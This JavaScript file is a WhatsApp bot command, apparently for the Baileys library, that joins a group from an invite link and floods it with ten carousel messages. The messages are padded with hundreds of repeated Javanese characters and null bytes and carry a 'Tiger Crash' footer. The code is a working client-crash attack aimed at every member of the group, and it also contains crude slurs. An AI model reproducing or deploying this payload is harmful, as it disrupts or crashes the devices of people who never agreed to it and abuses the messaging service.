import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

let handler = async (m, { conn, args, usedPrefix, command }) => {
  let link = args[0];
  if (!link || !link.includes('chat.whatsapp.com')) {
    return m.reply(`*Uso correcto:*\n${usedPrefix + command} https://chat.whatsapp.com/xxxxxxxxxxxxxxxx`);
  }

  // Extraer el código del link
  let code = link.split('https://chat.whatsapp.com/')[1].split('?')[0];

  try {
    // Unirse al grupo
    let res = await conn.groupAcceptInvite(code);
    await m.reply(`✅ Me uní al grupo: ${res}`);

    // Enviar 10 veces el carrusel
    for (let i = 0; i < 10; i++) {
      await carouselNew(res, conn);
    }
  } catch (e) {
    console.error(e);
    m.reply('❌ No pude unirme al grupo o enviar el carrusel.');
  }
};
handler.command = /^caroui$/i;
export default handler;

// Función que construye y envía el carrusel
async function carouselNew(isTarget, rikz) {
  let push = [];

  for (let i = 0; i < 10; i++) {
    push.push({
      body: {
        text: "CikssXyz" + "ꦾ".repeat(200)
      },
      footer: {
        text: "dont panic!!"
      },
      header: {
        title: 'memekk' + "\u0000".repeat(200),
        hasMediaAttachment: true,
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?...",
          mimetype: "image/jpeg",
          fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
          fileLength: "591",
          height: 0,
          width: 0,
          mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
          fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
          directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?...",
          mediaKeyTimestamp: "1721344123",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsb...",
          scansSidecar: "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
          scanLengths: [247, 201, 73, 63],
          midQualityFileSha256: "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
        }
      },
      nativeFlowMessage: {
        buttons: []
      }
    });
  }

  const carousel = generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: {
            text: "Kontol " + "ꦾ".repeat(200)
          },
          footer: {
            text: "( 🐉 ) Tiger Crash V1 Gen 2 ( 🐉 )"
          },
          header: {
            hasMediaAttachment: false
          },
          carouselMessage: {
            cards: push
          }
        }
      }
    }
  }, {});

  await rikz.relayMessage(isTarget, carousel.message, {
    messageId: carousel.key.id
  });

  console.log("✅ Carousel enviado");
}